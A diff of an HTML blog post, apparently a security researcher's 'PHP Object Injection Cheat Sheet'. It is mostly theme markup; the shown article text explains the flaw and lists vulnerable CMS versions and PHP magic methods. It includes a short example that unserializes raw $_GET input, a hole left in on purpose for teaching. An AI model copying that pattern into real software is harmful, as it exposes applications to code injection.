@@ -1,14 +1,1034 @@
-<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="PHP Object Injection Cheat Sheet" /><meta property="og:locale" content="en" /><meta name="description" content="Explore the personal blog of a cybersecurity expert with a rich history in Red Teaming, Penetration Testing, and Incident Response since 2017. Active in the cyber community through roles in DefCamp CTF and Romanian Cyber Security Challenges, plus contributions to the bug bounty community." /><meta property="og:description" content="Explore the personal blog of a cybersecurity expert with a rich history in Red Teaming, Penetration Testing, and Incident Response since 2017. Active in the cyber community through roles in DefCamp CTF and Romanian Cyber Security Challenges, plus contributions to the bug bounty community." /><link rel="canonical" href="https://nitesculucian.github.io/nitesculucian.github.io/2018/10/06/php-object-injection-cheat-sheet/" /><meta property="og:url" content="https://nitesculucian.github.io/nitesculucian.github.io/2018/10/06/php-object-injection-cheat-sheet/" /><meta property="og:site_name" content="Lucian Nitescu" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-10-06T00:40:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="PHP Object Injection Cheat Sheet" /><meta name="twitter:site" content="@LucianNitescu" /><meta name="google-site-verification" content="Dd0w5mhVXB9dYVNimgGPlkXQomqmN4lkMli1rxwJ4Ws" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2018-10-06T00:40:00+03:00","datePublished":"2018-10-06T00:40:00+03:00","description":"Explore the personal blog of a cybersecurity expert with a rich history in Red Teaming, Penetration Testing, and Incident Response since 2017. Active in the cyber community through roles in DefCamp CTF and Romanian Cyber Security Challenges, plus contributions to the bug bounty community.","headline":"PHP Object Injection Cheat Sheet","mainEntityOfPage":{"@type":"WebPage","@id":"https://nitesculucian.github.io/nitesculucian.github.io/2018/10/06/php-object-injection-cheat-sheet/"},"url":"https://nitesculucian.github.io/nitesculucian.github.io/2018/10/06/php-object-injection-cheat-sheet/"}</script><title>PHP Object Injection Cheat Sheet | Lucian Nitescu</title><meta name="apple-mobile-web-app-title" content="Lucian Nitescu"><meta name="application-name" content="Lucian Nitescu"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="preconnect" href="https://cdnjs.cloudflare.com" ><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="/nitesculucian.github.io/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/nitesculucian.github.io/" id="avatar" class="rounded-circle"><img src="nitesculucian.github.io/assets/img/profile.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/nitesculucian.github.io/">Lucian Nitescu</a></h1><p class="site-subtitle fst-italic mb-0">Cybersecurity Specialist</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/nitesculucian.github.io/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/nitesculucian.github.io/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/nitesculucian.github.io/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/nitesculucian.github.io/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/NitescuLucian" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LucianNitescu" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://t.me/luciannitescu" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/nitesculucian.github.io/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/nitesculucian.github.io/">Home</a> </span> <span>PHP Object Injection Cheat Sheet</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>PHP Object Injection Cheat Sheet</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1538775600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Oct 6, 2018 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/LucianNitescu">Lucian Nitescu</a> </em> </span> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="877 words" > <em>4 min</em> read</span></div></div></header><div class="content"><p><a href="nitesculucian.github.io/uploads/Screenshot%20from%202018-10-06%2000-59-06.png" class="popup img-link shimmer"><img src="nitesculucian.github.io/uploads/Screenshot%20from%202018-10-06%2000-59-06.png" alt="Image of PHP Object Injection" loading="lazy"></a></p><h2 id="description-of-the-vulnerability"><span class="me-2">Description of the vulnerability</span><a href="#description-of-the-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context.</p><p>The vulnerability occurs when <strong>user-supplied input is not properly sanitized</strong> before being passed to the <strong>unserialize() PHP function</strong>.</p><p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p><ul><li>The application must have a class which implements a <strong>PHP magic method</strong> (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a “POP chain”.<li>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.</ul><p><strong>Example:</strong></p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- `site.alt_lang` can specify a language different from the UI -->
+<html lang="en" >
+  <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta
+    name="viewport"
+    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
+  ><!-- Setup Open Graph image -->
+
+  
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="PHP Object Injection Cheat Sheet" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Explore the personal blog of a cybersecurity expert with a rich history in Red Teaming, Penetration Testing, and Incident Response since 2017. Active in the cyber community through roles in DefCamp CTF and Romanian Cyber Security Challenges, plus contributions to the bug bounty community." />
+<meta property="og:description" content="Explore the personal blog of a cybersecurity expert with a rich history in Red Teaming, Penetration Testing, and Incident Response since 2017. Active in the cyber community through roles in DefCamp CTF and Romanian Cyber Security Challenges, plus contributions to the bug bounty community." />
+<link rel="canonical" href="http://localhost:4000/2018/10/06/php-object-injection-cheat-sheet/" />
+<meta property="og:url" content="http://localhost:4000/2018/10/06/php-object-injection-cheat-sheet/" />
+<meta property="og:site_name" content="Lucian Nitescu" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-10-06T00:40:00+03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="PHP Object Injection Cheat Sheet" />
+<meta name="twitter:site" content="@LucianNitescu" />
+<meta name="google-site-verification" content="Dd0w5mhVXB9dYVNimgGPlkXQomqmN4lkMli1rxwJ4Ws" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2018-10-06T00:40:00+03:00","datePublished":"2018-10-06T00:40:00+03:00","description":"Explore the personal blog of a cybersecurity expert with a rich history in Red Teaming, Penetration Testing, and Incident Response since 2017. Active in the cyber community through roles in DefCamp CTF and Romanian Cyber Security Challenges, plus contributions to the bug bounty community.","headline":"PHP Object Injection Cheat Sheet","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2018/10/06/php-object-injection-cheat-sheet/"},"url":"http://localhost:4000/2018/10/06/php-object-injection-cheat-sheet/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <title>PHP Object Injection Cheat Sheet | Lucian Nitescu
+  </title>
+
+  <!--
+  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
+  Generated by: https://realfavicongenerator.net/
+-->
+
+
+
+
+
+
+<meta name="apple-mobile-web-app-title" content="Lucian Nitescu">
+<meta name="application-name" content="Lucian Nitescu">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+
+  
+    
+      <link rel="preconnect" href="https://fonts.googleapis.com" >
+      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+    
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
+    
+      <link rel="preconnect" href="https://fonts.googleapis.com" >
+      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+    
+      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+    
+      <link rel="preconnect" href="https://cdnjs.cloudflare.com" >
+      <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" >
+    
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+  
+
+  <!-- GA -->
+  
+
+  <!-- Bootstrap -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">
+
+  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
+
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
+  
+
+  
+    <!-- Manific Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
+  
+
+  <!-- JavaScript -->
+
+  
+    <!-- Switch the mode between dark and light. -->
+
+<script type="text/javascript">
+  class ModeToggle {
+    static get MODE_KEY() {
+      return 'mode';
+    }
+    static get MODE_ATTR() {
+      return 'data-mode';
+    }
+    static get DARK_MODE() {
+      return 'dark';
+    }
+    static get LIGHT_MODE() {
+      return 'light';
+    }
+    static get ID() {
+      return 'mode-toggle';
+    }
+
+    constructor() {
+      if (this.hasMode) {
+        if (this.isDarkMode) {
+          if (!this.isSysDarkPrefer) {
+            this.setDark();
+          }
+        } else {
+          if (this.isSysDarkPrefer) {
+            this.setLight();
+          }
+        }
+      }
+
+      let self = this;
+
+      /* always follow the system prefers */
+      this.sysDarkPrefers.addEventListener('change', () => {
+        if (self.hasMode) {
+          if (self.isDarkMode) {
+            if (!self.isSysDarkPrefer) {
+              self.setDark();
+            }
+          } else {
+            if (self.isSysDarkPrefer) {
+              self.setLight();
+            }
+          }
+
+          self.clearMode();
+        }
+
+        self.notify();
+      });
+    } /* constructor() */
+
+    get sysDarkPrefers() {
+      return window.matchMedia('(prefers-color-scheme: dark)');
+    }
+
+    get isSysDarkPrefer() {
+      return this.sysDarkPrefers.matches;
+    }
+
+    get isDarkMode() {
+      return this.mode === ModeToggle.DARK_MODE;
+    }
+
+    get isLightMode() {
+      return this.mode === ModeToggle.LIGHT_MODE;
+    }
+
+    get hasMode() {
+      return this.mode != null;
+    }
+
+    get mode() {
+      return sessionStorage.getItem(ModeToggle.MODE_KEY);
+    }
+
+    /* get the current mode on screen */
+    get modeStatus() {
+      if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) {
+        return ModeToggle.DARK_MODE;
+      } else {
+        return ModeToggle.LIGHT_MODE;
+      }
+    }
+
+    setDark() {
+      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
+    }
+
+    setLight() {
+      document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
+    }
+
+    clearMode() {
+      document.documentElement.removeAttribute(ModeToggle.MODE_ATTR);
+      sessionStorage.removeItem(ModeToggle.MODE_KEY);
+    }
+
+    /* Notify another plugins that the theme mode has changed */
+    notify() {
+      window.postMessage(
+        {
+          direction: ModeToggle.ID,
+          message: this.modeStatus
+        },
+        '*'
+      );
+    }
+
+    flipMode() {
+      if (this.hasMode) {
+        if (this.isSysDarkPrefer) {
+          if (this.isLightMode) {
+            this.clearMode();
+          } else {
+            this.setLight();
+          }
+        } else {
+          if (this.isDarkMode) {
+            this.clearMode();
+          } else {
+            this.setDark();
+          }
+        }
+      } else {
+        if (this.isSysDarkPrefer) {
+          this.setLight();
+        } else {
+          this.setDark();
+        }
+      }
+
+      this.notify();
+    } /* flipMode() */
+  } /* ModeToggle */
+
+  const modeToggle = new ModeToggle();
+</script>
+
+  
+
+  <!-- A placeholder to allow defining custom metadata -->
+
+</head>
+
+
+  <body>
+    <!-- The Side Bar -->
+
+<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
+  <header class="profile-wrapper">
+    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/profile.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>
+
+    <h1 class="site-title">
+      <a href="/">Lucian Nitescu</a>
+    </h1>
+    <p class="site-subtitle fst-italic mb-0">Cybersecurity Specialist</p>
+  </header>
+  <!-- .profile-wrapper -->
+
+  <nav class="flex-column flex-grow-1 w-100 ps-0">
+    <ul class="nav">
+      <!-- home -->
+      <li class="nav-item">
+        <a href="/" class="nav-link">
+          <i class="fa-fw fas fa-home"></i>
+          <span>HOME</span>
+        </a>
+      </li>
+      <!-- the real tabs -->
+      
+        <li class="nav-item">
+          <a href="/tags/" class="nav-link">
+            <i class="fa-fw fas fa-tags"></i>
+            
+
+            <span>TAGS</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+        <li class="nav-item">
+          <a href="/archives/" class="nav-link">
+            <i class="fa-fw fas fa-archive"></i>
+            
+
+            <span>ARCHIVES</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+        <li class="nav-item">
+          <a href="/about/" class="nav-link">
+            <i class="fa-fw fas fa-info-circle"></i>
+            
+
+            <span>ABOUT</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+    </ul>
+  </nav>
+
+  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
+    
+      <button type="button" class="mode-toggle btn" aria-label="Switch Mode">
+        <i class="fas fa-adjust"></i>
+      </button>
+
+      
+        <span class="icon-border"></span>
+      
+    
+
+    
+      
+
+      
+        <a
+          href="https://github.com/NitescuLucian"
+          aria-label="github"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+
+      
+        <a
+          href="https://twitter.com/LucianNitescu"
+          aria-label="twitter"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fa-brands fa-x-twitter"></i>
+        </a>
+      
+    
+      
+
+      
+        <a
+          href="https://t.me/luciannitescu"
+          aria-label="email"
+          
+
+          
+
+          
+
+          
+        >
+          <i class="fas fa-envelope"></i>
+        </a>
+      
+    
+      
+
+      
+        <a
+          href="/feed.xml"
+          aria-label="rss"
+          
+
+          
+
+          
+
+          
+        >
+          <i class="fas fa-rss"></i>
+        </a>
+      
+    
+  </div>
+  <!-- .sidebar-bottom -->
+</aside>
+<!-- #sidebar -->
+
+
+    <div id="main-wrapper" class="d-flex justify-content-center">
+      <div class="container d-flex flex-column px-xxl-5">
+        <!-- The Top Bar -->
+
+<header id="topbar-wrapper" aria-label="Top Bar">
+  <div
+    id="topbar"
+    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
+  >
+    <nav id="breadcrumb" aria-label="Breadcrumb">
+      
+
+      
+        
+          
+            <span>
+              <a href="/">Home</a>
+            </span>
+
+          
+        
+          
+        
+          
+        
+          
+        
+          
+            
+              <span>PHP Object Injection Cheat Sheet</span>
+            
+
+          
+        
+      
+    </nav>
+    <!-- endof #breadcrumb -->
+
+    <button type="button" id="sidebar-trigger" class="btn btn-link">
+      <i class="fas fa-bars fa-fw"></i>
+    </button>
+
+    <div id="topbar-title">
+      Post
+    </div>
+
+    <button type="button" id="search-trigger" class="btn btn-link">
+      <i class="fas fa-search fa-fw"></i>
+    </button>
+
+    <search class="align-items-center ms-3 ms-lg-0">
+      <i class="fas fa-search fa-fw"></i>
+      <input
+        class="form-control"
+        id="search-input"
+        type="search"
+        aria-label="search"
+        autocomplete="off"
+        placeholder="Search..."
+      >
+    </search>
+    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
+  </div>
+</header>
+
+
+        <div class="row flex-grow-1">
+          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              <!-- Refactor the HTML structure -->
+
+
+
+<!--
+  In order to allow a wide table to scroll horizontally,
+  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
+-->
+
+
+
+<!--
+  Fixed kramdown code highlight rendering:
+  https://github.com/penibelst/jekyll-compress-html/issues/101
+  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
+-->
+
+
+
+<!-- Change the icon of checkbox -->
+
+
+
+<!-- Handle images -->
+
+
+
+
+  
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
+
+<!-- Add header for code snippets -->
+
+
+
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+
+
+
+
+<!-- return -->
+
+
+
+
+<article class="px-1">
+  <header>
+    <h1 data-toc-skip>PHP Object Injection Cheat Sheet</h1>
+
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1538775600"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Oct  6, 2018
+</time>
+
+      </span>
+
+      <!-- lastmod date -->
+      
+
+      
+
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
+
+          By
+
+          <em>
+            
+              <a href="https://twitter.com/LucianNitescu">Lucian Nitescu</a>
+            
+          </em>
+        </span>
+
+        <!-- read time -->
+        <!-- Calculate the post's reading time, and display the word count in tooltip -->
+
+
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="877 words"
+>
+  <em>4 min</em> read</span>
+
+      </div>
+      <!-- .d-flex -->
+    </div>
+    <!-- .post-meta -->
+  </header>
+
+  <div class="content">
+    <p><a href="/uploads/Screenshot%20from%202018-10-06%2000-59-06.png" class="popup img-link  shimmer"><img src="/uploads/Screenshot%20from%202018-10-06%2000-59-06.png" alt="Image of PHP Object Injection" loading="lazy"></a></p>
+
+<h2 id="description-of-the-vulnerability"><span class="me-2">Description of the vulnerability</span><a href="#description-of-the-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context.</p>
+
+<p>The vulnerability occurs when <strong>user-supplied input is not properly sanitized</strong>  before being passed to the <strong>unserialize() PHP function</strong>.</p>
+
+<p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p>
+
+<ul>
+  <li>The application must have a class which implements a <strong>PHP magic method</strong> (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a “POP chain”.</li>
+  <li>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.</li>
+</ul>
+
+<p><strong>Example:</strong></p>
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
-</pre><td class="rouge-code"><pre><span class="c1">// some PHP code including PHP magic method ...</span>
+</pre></td><td class="rouge-code"><pre><span class="c1">// some PHP code including PHP magic method ...</span>
 
 <span class="nv">$user_data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'data'</span><span class="p">]);</span>
 
 <span class="c1">// some PHP code...</span>
-</pre></table></code></div></div><h2 id="known-vulnerable-software"><span class="me-2">Known Vulnerable Software</span><a href="#known-vulnerable-software" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><thead><tr><th>Software<th>Version<th>Reference<tbody><tr><td>WordPress<td>3.6.1<td>https://nvd.nist.gov/vuln/detail/CVE-2013-4338<tr><td>Magento<td>1.9.0.1<td>https://magento.com/security/patches/supee-10415<tr><td>Joomla<td>3.0.3<td>https://packetstormsecurity.com/files/121442/Joomla-3.0.3-PHP-Object-Injection.html<tr><td>IP Board<td>3.3.4<td>https://www.exploit-db.com/exploits/22398/<tr><td>Dotclear<td>2.6.1<td>https://www.cvedetails.com/cve/CVE-2014-1613/<tr><td>OpenCart<td>1.5.6.4<td>http://karmainsecurity.com/KIS-2014-08<tr><td>CubeCart<td>5.2.0<td>http://karmainsecurity.com/KIS-2013-02<tr><td>Drupal<td>7.34<td>https://websec.wordpress.com/2015/01/09/drupal-7-34-admin-php-object-injection/<tr><td>vBulletin<td>5.1.0<td>https://blog.sucuri.net/2014/03/security-exploit-patched-on-vbulletin-php-object-injection.html<tr><td>Tuelap<td>7.6-4<td>http://karmainsecurity.com/KIS-2014-13<tr><td>Moodle<td>2.5.0<td>http://disse.cting.org/2013/09/16/2013-09-16-moodle-2-5-0-1-badges-external-object-injection<tr><td>WHMCS<td>5.2.12<td>http://security-geeks.blogspot.com/2013/11/whmcs-5112-php-object-injectoin.html</table></div><h2 id="php-magic-methods"><span class="me-2">PHP Magic Methods</span><a href="#php-magic-methods" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><tbody><tr><td>__construct()<td>__set()<td>__toString()<tr><td>__destruct()<td>__isset()<td>__invoke()<tr><td>__call()<td>__unset()<td>__set_state()<tr><td>__callStatic()<td>__sleep()<td>__clone()<tr><td>__get()<td>__wakeup()<td>__debugInfo()</table></div><h2 id="examples-of-php-object-injection"><span class="me-2">Examples of PHP Object Injection</span><a href="#examples-of-php-object-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 